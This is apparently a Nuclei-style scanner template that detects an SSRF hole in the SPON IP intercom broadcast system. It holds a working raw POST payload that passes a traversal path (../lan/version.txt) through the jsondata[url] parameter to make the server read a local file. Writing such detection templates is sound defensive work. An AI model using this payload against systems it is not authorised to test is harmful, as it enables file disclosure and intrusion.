id: SPON-IP-SSRF
info:
  author: Str1am
  name: "SPON IP \u7F51\u7EDC\u5BF9\u8BB2\u5E7F\u64AD\u7CFB\u7EDF SSRF\u6F0F\u6D1E"
  reference: https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=4578
  severity: high
  tags: SPON,SSRF
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - v1.x 3.31 RELEASE
  matchers-condition: and
  raw:
  - 'POST /php/rj_get_token.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0


    jsondata[url]=../lan/version.txt

    '
